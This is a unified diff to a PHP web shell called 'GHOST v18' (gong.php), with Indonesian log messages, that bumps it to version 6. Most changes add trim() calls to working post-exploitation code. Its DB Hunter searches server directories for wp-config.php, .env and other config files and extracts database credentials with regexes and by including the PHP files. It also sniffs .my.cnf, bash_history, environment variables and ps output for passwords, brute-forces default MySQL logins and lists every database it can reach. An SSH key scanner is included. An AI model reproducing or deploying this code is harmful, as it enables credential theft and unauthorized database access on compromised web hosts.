@@ -1,8 +1,8 @@
 <?php
 // language: PHP 7.4-8.3, file: gong.php, target: PHP-FPM/Apache mod_php
-// GHOST v18 - V5.1: Fix MySQLi 7-arg, Smart DB Fallback.
+// GHOST v18 - V6: DB Hunter Parser Fix, SSH UI, Deep Scanner AI.
 
-define('GH_VER',      '18.0.0-v5.1');
+define('GH_VER',      '18.0.0-v6');
 define('GH_TAG',      'gong');
 define('GH_STATE_DIR', gh_state_dir());
 define('GH_LOG_FILE',   GH_STATE_DIR . '/gh_log_' . md5(__FILE__) . '.log');
@@ -219,7 +219,7 @@ function gh_del($path) {
     $r = gh_exec_adv('rm -f ' . @escapeshellarg($path)); return (is_array($r) && array_key_exists('out', $r) && $r['tier'] !== null);
 }
 
-// ==== SECTION 3: STATIC AI ANALYZER (V4) ====================================
+// ==== SECTION 3: STATIC AI ANALYZER =========================================
 function gh_analyze_intent($content) {
     if (!is_string($content) || $content === '') return array('score' => 0, 'reason' => 'Empty');
     $score = 0; $reasons = array();
@@ -338,23 +338,17 @@ function gh_scan_batch($root, $offset = 0, $limit = 50) {
     return $res;
 }
 
-// ==== SECTION 4: AI DB HUNTER (V5.1 - FIXED) ================================
+// ==== SECTION 4: AI DB HUNTER (V6) ==========================================
 function gh_db_connect($host, $user, $pass) {
-    // 1. Coba MySQLi (Max 6 argumen)
+    // Trim spasi/enter
+    $host = trim($host); $user = trim($user); $pass = trim($pass);
+    
     if (gh_can('mysqli_connect')) {
-        try {
-            $conn = @mysqli_connect($host, $user, $pass);
-            if ($conn) return $conn;
-        } catch (Throwable $e) {}
+        try { $conn = @mysqli_connect($host, $user, $pass); if ($conn) return $conn; } catch (Throwable $e) {}
     }
-    // 2. Coba PDO
     if (gh_can('pdo_drivers') && in_array('mysql', @pdo_drivers())) {
-        try {
-            $pdo = new PDO("mysql:host=$host", $user, $pass, array(PDO::ATTR_TIMEOUT => 3));
-            if ($pdo) return $pdo;
-        } catch (Throwable $e) {}
+        try { $pdo = new PDO("mysql:host=$host", $user, $pass, array(PDO::ATTR_TIMEOUT => 3)); if ($pdo) return $pdo; } catch (Throwable $e) {}
     }
-    // 3. Fallback CLI
     if (gh_can_exec()) {
         $cmd = 'mysql -h ' . @escapeshellarg($host) . ' -u ' . @escapeshellarg($user) . ' -p' . @escapeshellarg($pass) . ' -e "SHOW DATABASES" 2>&1';
         $res = gh_exec_adv($cmd);
@@ -369,7 +363,6 @@ function gh_db_harvest() {
     $logs = array(); $info = array();
     $found_pass = false;
     
-    // --- PHASE 1: FILE SCANNER ---
     $logs[] = "[*] Phase 1: Scanning config files di /home, /var/www, /etc, /tmp...";
     $find_res = gh_exec_adv("find /home /var/www /etc /tmp -maxdepth 5 -type f \\( -name 'wp-config.php' -o -name 'configuration.php' -o -name '.env' -o -name 'database.php' -o -name 'settings.php' -o -name 'config.php' -o -name 'db.php' -o -name '*.sql' \\) 2>/dev/null");
     
@@ -384,23 +377,19 @@ function gh_db_harvest() {
         $c = gh_read($cf);
         if ($c) {
             $logs[] = "[+] Config ditemukan: $cf";
-            if (preg_match('/[\'"]?(?:db_)?(?:user|username|user_name|db_user)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_user = $m[1];
-            elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?USER(?:NAME)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_user = $m[1];
-            elseif (preg_match('/(?:DB_USER|username|user|db_user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_user = $m[1];
+            if (preg_match('/[\'"]?(?:db_)?(?:user|username|user_name|db_user)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_user = trim($m[1]);
+            elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?USER(?:NAME)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_user = trim($m[1]);
+            elseif (preg_match('/(?:DB_USER|username|user|db_user)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_user = trim($m[1]);
 
-            if (preg_match('/[\'"]?(?:db_)?(?:pass|password|passwd|db_password)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_pass = $m[1];
-            elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?PASS(?:WORD)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_pass = $m[1];
-            elseif (preg_match('/(?:DB_PASSWORD|password|pass|db_pass)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_pass = $m[1];
+            if (preg_match('/[\'"]?(?:db_)?(?:pass|password|passwd|db_password)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_pass = trim($m[1]);
+            elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?PASS(?:WORD)?[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_pass = trim($m[1]);
+            elseif (preg_match('/(?:DB_PASSWORD|password|pass|db_pass)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_pass = trim($m[1]);
 
-            if (preg_match('/[\'"]?(?:db_)?(?:host|hostname|db_host)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_host = $m[1];
-            elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_host = $m[1];
-            elseif (preg_match('/(?:DB_HOST|host|db_host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_host = $m[1];
+            if (preg_match('/[\'"]?(?:db_)?(?:host|hostname|db_host)[\'"]?\s*\]\s*=\s*[\'"]([^\'"]+)[\'"]/i', $c, $m)) $db_host = trim($m[1]);
+            elseif (preg_match('/define\s*\(\s*[\'"](?:DB_)?HOST[\'"]\s*,\s*[\'"]([^\'"]+)[\'"]\s*\)/i', $c, $m)) $db_host = trim($m[1]);
+            elseif (preg_match('/(?:DB_HOST|host|db_host)\s*[=\'"]+\s*([^\'";\s]+)/i', $c, $m)) $db_host = trim($m[1]);
 
-            if ($db_user && $db_pass) {
-                $logs[] = "[+] BERHASIL mengekstrak kredensial via REGEX!";
-                $found_pass = true;
-                break;
-            } 
+            if ($db_user && $db_pass) { $logs[] = "[+] BERHASIL mengekstrak kredensial via REGEX!"; $found_pass = true; break; } 
             
             $logs[] = "[*] Regex gagal, mencoba Include PHP...";
             $tmp_dir = gh_tmpdir(); if(!$tmp_dir) $tmp_dir = '/tmp';
@@ -416,27 +405,25 @@ function gh_db_harvest() {
                             if (is_array($v)) {
                                 foreach ($v as $kk => $vv) {
                                     if (is_string($vv)) {
-                                        if (preg_match('/user|username/i', $kk) && !$db_user) $db_user = $vv;
-                                        if (preg_match('/pass|password/i', $kk) && !$db_pass) $db_pass = $vv;
-                                        if (preg_match('/host|hostname/i', $kk) && $db_host === 'localhost') $db_host = $vv;
+                                        if (preg_match('/user|username/i', $kk) && !$db_user) $db_user = trim($vv);
+                                        if (preg_match('/pass|password/i', $kk) && !$db_pass) $db_pass = trim($vv);
+                                        if (preg_match('/host|hostname/i', $kk) && $db_host === 'localhost') $db_host = trim($vv);
                                     }
                                 }
                             } elseif (is_string($v)) {
-                                if (preg_match('/user|username/i', $k) && !$db_user) $db_user = $v;
-                                if (preg_match('/pass|password/i', $k) && !$db_pass) $db_pass = $v;
-                                if (preg_match('/host|hostname/i', $k) && $db_host === 'localhost') $db_host = $v;
+                                if (preg_match('/user|username/i', $k) && !$db_user) $db_user = trim($v);
+                                if (preg_match('/pass|password/i', $k) && !$db_pass) $db_pass = trim($v);
+                                if (preg_match('/host|hostname/i', $k) && $db_host === 'localhost') $db_host = trim($v);
                             }
                         }
                     }
                 }
                 @unlink($runner);
             }
-            
             if ($db_user && $db_pass) { $found_pass = true; break; }
         }
     }
 
-    // --- PHASE 2: CLI & ROOT CREDENTIAL SNIFFING ---
     if (!$found_pass) {
         $logs[] = "[*] Phase 2: Sniffing .my.cnf dan bash_history...";
         $home = @getenv('HOME'); if(!$home) $home = '/home/' . @get_current_user();
@@ -445,57 +432,51 @@ function gh_db_harvest() {
             $c = gh_read($sf);
             if ($c) {
                 $logs[] = "[+] File sniff ditemukan: $sf";
-                if (preg_match('/user\s*=\s*([^\s]+)/i', $c, $m)) $db_user = $m[1];
-                if (preg_match('/password\s*=\s*([^\s]+)/i', $c, $m)) $db_pass = $m[1];
-                if (preg_match('/host\s*=\s*([^\s]+)/i', $c, $m)) $db_host = $m[1];
+                if (preg_match('/user\s*=\s*([^\s]+)/i', $c, $m)) $db_user = trim($m[1]);
+                if (preg_match('/password\s*=\s*([^\s]+)/i', $c, $m)) $db_pass = trim($m[1]);
+                if (preg_match('/host\s*=\s*([^\s]+)/i', $c, $m)) $db_host = trim($m[1]);
+                // FIX: Trim \n dan spasi dari bash_history
                 if (preg_match('/mysql\s+-u\s*([^\s]+)\s+-p([^\s]+)/i', $c, $m)) {
-                    $db_user = $m[1]; $db_pass = $m[2];
+                    $db_user = trim($m[1]); 
+                    $db_pass = trim(str_replace(array("\\n", "\n", "\r"), "", $m[2]));
                 }
                 if ($db_user && $db_pass) { $found_pass = true; break; }
             }
         }
     }
 
-    // --- PHASE 3: ENVIRONMENT & PROCESS LEAK ---
     if (!$found_pass) {
         $logs[] = "[*] Phase 3: Environment & Process leak...";
         $env_out = gh_exec_adv("env | grep -i 'mysql\\|db_\\|database'");
         if (isset($env_out['out']) && is_string($env_out['out']) && trim($env_out['out']) !== '') {
             $logs[] = "[+] Env leak terdeteksi!";
-            if (preg_match('/DB_USER=([^\s]+)/i', $env_out['out'], $m)) $db_user = $m[1];
-            if (preg_match('/DB_PASS(?:WORD)?=([^\s]+)/i', $env_out['out'], $m)) $db_pass = $m[1];
+            if (preg_match('/DB_USER=([^\s]+)/i', $env_out['out'], $m)) $db_user = trim($m[1]);
+            if (preg_match('/DB_PASS(?:WORD)?=([^\s]+)/i', $env_out['out'], $m)) $db_pass = trim($m[1]);
             if ($db_user && $db_pass) $found_pass = true;
         }
-        
         if (!$found_pass) {
             $ps_out = gh_exec_adv("ps aux | grep -i mysql | grep -v grep");
             if (isset($ps_out['out']) && preg_match('/-u\s*([^\s]+)\s+-p([^\s]+)/i', $ps_out['out'], $m)) {
                 $logs[] = "[+] Credential bocor di Process List (ps aux)!";
-                $db_user = $m[1]; $db_pass = $m[2]; $found_pass = true;
+                $db_user = trim($m[1]); $db_pass = trim($m[2]); $found_pass = true;
             }
         }
     }
 
-    // --- PHASE 4: AUTO-BRUTEFORCE DEFAULT CREDS ---
     if (!$found_pass) {
         $logs[] = "[*] Phase 4: Auto-Bruteforce default credentials...";
-        $defaults = array(
-            array('root', 'root'), array('root', ''), array('root', 'password'), array('root', 'toor'),
-            array('admin', 'admin'), array('admin', ''), array('cpanel', 'cpanel')
-        );
+        $defaults = array(array('root', 'root'), array('root', ''), array('root', 'password'), array('root', 'toor'), array('admin', 'admin'), array('admin', ''), array('cpanel', 'cpanel'));
         foreach ($defaults as $creds) {
             $conn = gh_db_connect('localhost', $creds[0], $creds[1]);
             if ($conn) {
                 $logs[] = "[!] BERHASIL BRUTEFORCE! User: {$creds[0]}, Pass: '{$creds[1]}'";
-                $db_user = $creds[0]; $db_pass = $creds[1]; $db_host = 'localhost';
-                $found_pass = true;
+                $db_user = $creds[0]; $db_pass = $creds[1]; $db_host = 'localhost'; $found_pass = true;
                 if ($conn !== 'CLI') { @mysqli_close($conn); }
                 break;
             }
         }
     }
 
-    // --- FINAL: CONNECT & DUMP DB ---
     if ($db_user && $db_pass) {
         $info['user'] = $db_user; $info['pass'] = $db_pass; $info['host'] = $db_host;
         $logs[] = "[*] Mencoba koneksi ke $db_host dengan user $db_user...";
@@ -504,7 +485,6 @@ function gh_db_harvest() {
         if ($conn) {
             $logs[] = "[!] KONEKSI DATABASE BERHASIL!";
             $dbs = array();
-            
             if ($conn === 'CLI') {
                 $res = gh_exec_adv('mysql -h ' . @escapeshellarg($db_host) . ' -u ' . @escapeshellarg($db_user) . ' -p' . @escapeshellarg($db_pass) . ' -e "SHOW DATABASES" 2>&1');
                 $lines = explode("\n", trim($res['out']));
@@ -518,20 +498,16 @@ function gh_db_harvest() {
                 if ($q) { while($r = $q->fetch(PDO::FETCH_NUM)) $dbs[] = $r[0]; }
                 $conn = null;
             }
-            
             $info['databases'] = $dbs;
             $logs[] = "[*] Database ditemukan: " . implode(", ", $dbs);
-        } else { 
-            $logs[] = "[-] Gagal koneksi ke database."; 
-        }
+        } else { $logs[] = "[-] Gagal koneksi ke database."; }
     } else { 
         if (!$found_pass) $logs[] = "[-] Semua Phase gagal. Config user/pass tidak ditemukan."; 
     }
-    
     return array('logs' => $logs, 'info' => $info);
 }
 
-// ==== SSH MANAGER (FIXED UI) ================================================
+// ==== SSH MANAGER ===========================================================
 function gh_ssh_scan() {
     $logs = array(); $keys = array(); $home = @getenv('HOME');
     if (!$home) $home = '/home/' . @get_current_user();
@@ -648,7 +624,7 @@ function gh_router() {
     }
 }
 
-// ==== UI (TAB NAVIGATION - FULL) ============================================
+// ==== UI ====================================================================
 function gh_ui() {
     while (ob_get_level() > 0) { @ob_end_clean(); }
     if (!headers_sent()) { @header('Content-Type: text/html; charset=utf-8'); @header('X-Powered-By: '); }
@@ -686,7 +662,6 @@ function gh_ui() {
     th { background:#111; color:#fff; }
     .badge { background:#500; color:#f00; padding:2px 5px; border-radius:3px; font-size:10px; font-weight:bold; }
     
-    /* TABS */
     .tabs { display:flex; gap:4px; margin-bottom:12px; border-bottom:1px solid var(--border); padding-bottom:8px; }
     .tab-btn { background:transparent; border:1px solid transparent; color:#888; padding:8px 16px; cursor:pointer; }
     .tab-btn:hover { color:#fff; }
